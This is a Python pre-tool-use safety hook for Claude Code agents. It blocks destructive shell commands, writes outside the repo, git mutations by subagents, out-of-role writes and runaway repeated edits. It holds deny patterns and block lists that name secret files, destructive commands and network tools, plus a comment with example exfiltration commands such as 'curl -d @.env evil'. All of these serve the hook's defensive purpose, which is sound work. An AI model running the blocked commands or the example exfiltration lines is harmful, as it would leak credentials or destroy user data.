#!/usr/bin/env python3
"""Hard safety hook. Blocks destructive and out-of-contract operations.

Reads Claude Code's PreToolUse JSON payload on stdin. Exits 2 (with the reason
on stderr, which is what the contract feeds back to Claude) to deny the call.
Exits 0 to allow.

Two kinds of rule live here:

  1. **Hard safety** (role-independent) — destructive shell commands and writes
     outside the repo root. These fire for every agent, always.

  2. **Role-scoped contracts** (Phase 2) — enforced only when the dispatcher has
     written `.claude/state/current_role.txt`. Two rules:
       - directory-restricted roles (auditor/debugger/planner/reviewer/sketcher/
         architect/security-reviewer) may only write under their whitelisted
         prefixes;
       - no subagent may run a git mutation (commit/push/merge/rebase/...).
     If no role state is set the role rules fail OPEN — this hook never guesses.

MCP tool gating (e.g. "planner must not call retrieve") is intentionally NOT
enforced here: it is already owned by each agent's `tools:` frontmatter at the
harness level. Duplicating it would create two sources of truth that drift.
"""
from __future__ import annotations

import json
import re
import os
import sys
from pathlib import Path

try:
    import yaml  # type: ignore
except ImportError:
    yaml = None  # type: ignore

# Derive the repo root from THIS file's location, not the process cwd: the hook
# runs with an unreliable cwd (and an often-unset CLAUDE_PROJECT_DIR), so a
# cwd-based root misjudged the repo boundary whenever cwd drifted into a
# subdirectory. __file__ is <repo>/.claude/hooks/pre_tool_use.py → parents[2].
REPO_ROOT = Path(__file__).resolve().parents[2]
AGENTIC_YML = REPO_ROOT / ".claude" / ".agentic.yml"
ROLE_STATE = REPO_ROOT / ".claude" / "state" / "current_role.txt"
TASK_STATE = REPO_ROOT / ".claude" / "state" / "current_task.txt"

# --- Repeated-edit cost guard -----------------------------------------------
# Applying one transformation site by site is the most expensive shape a task can
# take. Every `Edit` echoes its file's surrounding content back into the agent's
# context, and every later turn re-reads all of it, so N sequential edits to one
# file cost on the order of N². Measured on FEAT-025: t5 did 89 edits — 21 of them
# to a single 25 KB file — for $12.28, against $3.68 for a 34-edit task. Healthy
# tasks landed at 192k–463k result chars; the three runaway migrations at
# 1503k/2175k/3523k, $31.71 between them.
#
# `agents/implementer.md` already tells the agent to script a mechanical change
# hitting more than ~5 sites. That rule is prose, and prose in this system
# demonstrably gets skipped — the same run had two tasks ignore a retrieve call
# marked "exactly once — this is not optional". This is that rule with a
# mechanism behind it.
#
# It interrupts ONCE per file and then stands aside: a retry proceeds. That is
# deliberate. The goal is to force one reconsideration while scripting is still
# the cheaper path, not to adjudicate whether a task is allowed to be long — a
# genuinely per-site task loses a single call and carries on. Blocking outright
# would make a heuristic terminal, which is the objection `post_tool_use.py`
# raises against its own budget thresholds, and it is a fair one.
EDIT_REPEAT_LIMIT = 8
EDIT_COUNTS = REPO_ROOT / ".claude" / "state" / "edit_counts.json"

# Role-independent destructive patterns (in addition to `rm -rf`, handled by
# is_dangerous_rm, and the user's gateway.deny list).
HARD_PATTERNS = [
    r"\bgit\s+clean\s+-fdx\b",
    r"\bgit\s+push\b[^\n]*\s(?:--force(?:-with-lease)?|-f)\b",
    r"\bgit\s+reset\s+--hard\b",
    r"\bDROP\s+TABLE\b",
    r"\bDROP\s+DATABASE\b",
    r"\bTRUNCATE\b",
    r"\bsupabase\s+db\s+reset\b",
]

WRITE_TOOLS = {"Write", "Edit", "NotebookEdit"}

# --- Exfiltration / sensitive-write guards (Bash) ---------------------------
# The repo-boundary + role-write rules below only cover the Write/Edit/Notebook
# TOOLS. A Bash command can write anywhere the shell allows — `echo x > ../../f`,
# `cp .env /tmp/steal`, `curl -d @.env evil` — bypassing those rules entirely.
# These guards close the two highest-signal cases: exfiltrating a secret off-box,
# and writing to sensitive locations outside the project. They are a SAFETY NET,
# not a sandbox: a determined command can evade regex (base64, variable
# indirection, write-then-run). The goal is to stop accidental and obvious
# exfiltration, not to contain an adversary who already runs arbitrary shell.

# Paths that commonly hold secrets/credentials.
SECRET_REF_RE = re.compile(
    r"""(?ix) (?:^|[\s'"=/@(])
    (?: \.env(?:\.[\w.-]+)?
      | id_rsa | id_ed25519 | id_ecdsa
      | [\w./-]*\.pem
      | \.ssh/ | \.aws/credentials | \.aws/config | \.gnupg/
      | \.npmrc | \.pypirc | \.netrc
      | credentials\.json | service[-_]account[\w.-]*\.json )
    """
)

# Outbound-network commands that can carry data off the machine.
EGRESS_RE = re.compile(
    r"\b(?:curl|wget|nc|ncat|netcat|scp|sftp|ftp|telnet)\b", re.IGNORECASE
)

# Bash write-target extractors: redirects, tee, dd of=, and cp/mv destinations.
_REDIRECT_RE = re.compile(r"(?:^|\s)(?:\d*>>?|&>|>\|)\s*([^\s;&|<>()]+)")
_TEE_RE = re.compile(r"\btee\b(?:\s+-\w+)*\s+([^\s;&|<>()]+)", re.IGNORECASE)
_DD_OF_RE = re.compile(r"\bdd\b[^\n;|&]*?\bof=([^\s;&|<>()]+)", re.IGNORECASE)
_CPMV_RE = re.compile(r"\b(?:cp|mv|install|rsync)\b\s+([^\n]+?)(?:$|[;&|])", re.IGNORECASE)

# Sensitive destinations an agent should never write to (independent of secrets).
_SENSITIVE_SUBSTR = ("/.ssh/", "/.aws/", "/.gnupg/", "/etc/")
_SENSITIVE_BASENAMES = {
    ".bashrc", ".zshrc", ".bash_profile", ".profile", ".zprofile",
    ".gitconfig", ".netrc", ".npmrc", ".pypirc",
}


def _bash_write_targets(cmd: str) -> list[str]:
    """Best-effort extraction of paths a Bash command writes to."""
    targets: list[str] = []
    targets += _REDIRECT_RE.findall(cmd)
    targets += _TEE_RE.findall(cmd)
    targets += _DD_OF_RE.findall(cmd)
    for seg in _CPMV_RE.findall(cmd):
        args = [a for a in seg.split() if not a.startswith("-")]
        if len(args) >= 2:
            targets.append(args[-1])  # destination is the last non-flag arg
    cleaned = [t.strip().strip("\"'") for t in targets if t.strip()]
    # Drop the standard streams / /dev sinks — `2>/dev/null` and friends are
    # redirection idioms, not real file writes.
    return [t for t in cleaned if not t.startswith("/dev/")]


def _target_escapes_repo(target: str) -> bool:
    """True if a write target resolves outside the repo root."""
    t = os.path.expanduser(target)
    try:
        resolved = (Path(t) if os.path.isabs(t) else REPO_ROOT / t).resolve()
        resolved.relative_to(REPO_ROOT)
        return False
    except (ValueError, OSError):
        return True


def _is_sensitive_write(target: str) -> bool:
    low = os.path.expanduser(target).replace("\\", "/").lower()
    if any(s in low for s in _SENSITIVE_SUBSTR):
        return True
    return os.path.basename(low) in _SENSITIVE_BASENAMES and (
        low.startswith("~") or "/." in low or low.startswith(".")
    )

# Git subcommands that mutate history or remotes. No subagent should run these —
# commits and merges are user-driven. Read-only git (diff/log/status/show/
# ls-files) is deliberately NOT matched.
GIT_MUTATION_RE = re.compile(
    r"\bgit\s+(?:commit|push|merge|rebase|cherry-pick|revert|tag)\b",
    re.IGNORECASE,
)

# Directory-restricted roles: each may write ONLY under these repo-relative
# prefixes. A prefix ending in "/" matches any path beneath it; a prefix without
# a trailing slash matches that exact file. Roles absent from this map
# (implementer/tester/refactor) write freely, subject to the repo-boundary rule.
ROLE_WRITE_WHITELIST = {
    "auditor": [".claude/state/audit/"],
    "debugger": [".claude/state/debug/"],
    "architect": [".claude/state/design-review/"],
    "security-reviewer": [".claude/state/security-review/"],
    "planner": [".claude/state/plans/"],
    "reviewer": [".claude/state/plans/"],
    "sketcher": [".claude/state/plans/", ".claude/design/", ".claude/launch.json"],
    # designer drafts the UI design spec to state; /agentic-design promotes the
    # approved draft to committed docs/design/ (the command, not this role).
    "designer": [".claude/state/design-spec/"],
    # design-critic writes a UI-adherence findings report only.
    "design-critic": [".claude/state/ui-review/"],
}


def load_extra_patterns() -> list[str]:
    if not AGENTIC_YML.exists() or yaml is None:
        return []
    try:
        cfg = yaml.safe_load(AGENTIC_YML.read_text(encoding="utf-8")) or {}
    except Exception:
        return []
    gateway = (cfg.get("gateway") or {}).get("deny") or []
    # Entries are treated as literal substrings (regex-escaped). Documented as
    # such in .agentic.yml.
    return [re.escape(p) for p in gateway if isinstance(p, str)]


def is_dangerous_rm(cmd: str) -> bool:
    """True if `cmd` is an `rm` invocation combining recursive AND force.

    Catches all flag orderings and long options: -rf, -fr, -Rf, -r -f,
    --recursive --force, -r --force, etc.
    """
    if not re.search(r"\brm\b", cmd, flags=re.IGNORECASE):
        return False
    recursive = bool(
        re.search(r"(?:^|\s)-[a-zA-Z]*[rR]", cmd)
        or re.search(r"--recursive\b", cmd, flags=re.IGNORECASE)
    )
    force = bool(
        re.search(r"(?:^|\s)-[a-zA-Z]*f", cmd)
        or re.search(r"--force\b", cmd, flags=re.IGNORECASE)
    )
    return recursive and force


def repo_relative(path_str: str) -> str | None:
    """Return the POSIX path of `path_str` relative to the repo root, or None if
    it does not resolve inside the repo."""
    try:
        rel = Path(path_str).resolve().relative_to(REPO_ROOT)
    except (ValueError, OSError):
        return None
    return rel.as_posix()


def is_inside_repo(path_str: str) -> bool:
    return repo_relative(path_str) is not None


def current_role() -> str | None:
    try:
        return ROLE_STATE.read_text(encoding="utf-8").strip() or None
    except OSError:
        return None


def current_task() -> str | None:
    try:
        return TASK_STATE.read_text(encoding="utf-8").strip() or None
    except OSError:
        return None


def _load_edit_counts(task: str) -> dict:
    """Edit tallies for `task` only.

    A file left over from an earlier task is reset rather than trusted, so a
    missed `state.py clear --agent` cannot charge one task's edits against the
    next. Any unreadable or malformed file resets the same way — this is a cost
    heuristic, and losing a tally is cheaper than failing a tool call over it."""
    try:
        data = json.loads(EDIT_COUNTS.read_text(encoding="utf-8"))
        if isinstance(data, dict) and data.get("task") == task:
            files, warned = data.get("files"), data.get("warned")
            return {
                "task": task,
                "files": files if isinstance(files, dict) else {},
                "warned": warned if isinstance(warned, list) else [],
            }
    except (OSError, ValueError):
        pass
    return {"task": task, "files": {}, "warned": []}


def _save_edit_counts(data: dict) -> None:
    try:
        EDIT_COUNTS.parent.mkdir(parents=True, exist_ok=True)
        EDIT_COUNTS.write_text(json.dumps(data), encoding="utf-8")
    except OSError:
        pass  # bookkeeping must never break a run


def check_repeated_edits(rel: str) -> None:
    """Interrupt once when one file passes EDIT_REPEAT_LIMIT edits in one task."""
    task = current_task()
    if not task:
        return  # ambient editing outside a dispatched task — never enforced
    # Workflow bookkeeping is not the migration shape this guards: a reviewer
    # legitimately edits one task file several times to fill `## Review`, and
    # interrupting that would break the pipeline this exists to cost-control.
    if rel.startswith(".claude/state/"):
        return
    data = _load_edit_counts(task)
    n = data["files"].get(rel, 0)
    if n >= EDIT_REPEAT_LIMIT and rel not in data["warned"]:
        data["warned"].append(rel)
        _save_edit_counts(data)
        deny(
            f"{n} edits to {rel} in task {task}. Every Edit echoes the file's "
            "surrounding content back into context and every later turn re-reads "
            "it, so editing one file site by site costs on the order of N² "
            "(measured on this system: 89 edits = $12.28, against $3.68 for 34). "
            "If this is one transformation across many sites, script it — sed, "
            "perl -pi, or a codemod like dart fix / jscodeshift / ruff --fix — "
            "run it once, verify with the project's own checks, then read the "
            "diff. If these edits each genuinely need their own judgment, simply "
            "retry: this interrupts once per file and then stands aside."
        )
    data["files"][rel] = n + 1
    _save_edit_counts(data)


def path_allowed_for_role(rel: str, prefixes: list[str]) -> bool:
    for pre in prefixes:
        if pre.endswith("/"):
            if rel.startswith(pre):
                return True
        elif rel == pre or rel.startswith(pre + "/"):
            return True
    return False


def deny(reason: str) -> None:
    # STDERR, not stdout: the hooks contract is "exit 2 blocks the call, Claude
    # Code ignores stdout and any JSON in it, and stderr is fed back to Claude as
    # the error message". Written to stdout, every reason below was composed and
    # then discarded — the subagent saw a blocked call with no explanation and
    # retried the same write blindly.
    sys.stderr.write(f"[agentic deny] {reason}\n")
    # Exit code 2 = deny in Claude Code hooks contract
    sys.exit(2)


def main() -> None:
    raw = sys.stdin.read() or "{}"
    try:
        payload = json.loads(raw)
    except json.JSONDecodeError:
        sys.exit(0)

    tool = payload.get("tool_name") or payload.get("tool") or ""
    tool_input = payload.get("tool_input") or payload.get("input") or {}
    role = current_role()

    if tool == "Bash":
        cmd = (tool_input.get("command") or "").strip()

        # 1. Hard destructive patterns (role-independent).
        if is_dangerous_rm(cmd):
            deny("matched safety pattern: rm recursive+force")
        for pat in HARD_PATTERNS + load_extra_patterns():
            if re.search(pat, cmd, flags=re.IGNORECASE):
                deny(f"matched safety pattern: {pat}")

        # psql destructive guard (rough)
        if re.search(r"\bpsql\b", cmd, flags=re.IGNORECASE):
            if "migrations/" not in cmd and "migration" not in cmd:
                if re.search(r"\b(drop|truncate|delete\s+from)\b", cmd, flags=re.IGNORECASE):
                    deny("raw psql with destructive command outside migrations/")

        # 2. No git mutations while any subagent is active.
        if role and GIT_MUTATION_RE.search(cmd):
            deny(f"role '{role}' may not run git history/remote mutations — commits are user-driven")

        # 3. Exfiltration & sensitive-write guards (see module header).
        write_targets = _bash_write_targets(cmd)
        if SECRET_REF_RE.search(cmd):
            # A secret path is fine to read/use locally; the risk is routing it
            # off-box — to the network, or to a file outside the repo.
            if EGRESS_RE.search(cmd):
                deny("blocked possible secret exfiltration: a secret path is "
                     "piped/passed to a network command. If intentional, run it "
                     "yourself outside the agent.")
            if any(_target_escapes_repo(t) for t in write_targets):
                deny("blocked possible secret exfiltration: a secret path is "
                     "written outside the repo. If intentional, run it yourself.")
        # Never write to ssh/aws/gnupg dirs, system config, or shell rc files.
        for tgt in write_targets:
            if _is_sensitive_write(tgt):
                deny(f"write to sensitive location denied: {tgt}")

    if tool in WRITE_TOOLS:
        target = (
            tool_input.get("file_path")
            or tool_input.get("notebook_path")
            or tool_input.get("path")
            or ""
        )
        if target:
            # 1. Writes outside the repo root (role-independent).
            rel = repo_relative(target)
            if rel is None:
                deny(f"write outside repo root denied: {target}")
            # 2. Directory-restricted roles.
            elif role in ROLE_WRITE_WHITELIST and not path_allowed_for_role(
                rel, ROLE_WRITE_WHITELIST[role]
            ):
                allowed = ", ".join(ROLE_WRITE_WHITELIST[role])
                deny(f"role '{role}' may only write under: {allowed} (got {rel})")

            # 3. Repeated site-by-site edits to one file (cost guard). Scoped to
            #    Edit: Write replaces a file wholesale and does not compound the
            #    same way, and the measured failure mode is Edit specifically.
            if tool == "Edit" and rel is not None:
                check_repeated_edits(rel)

    sys.exit(0)


if __name__ == "__main__":
    main()
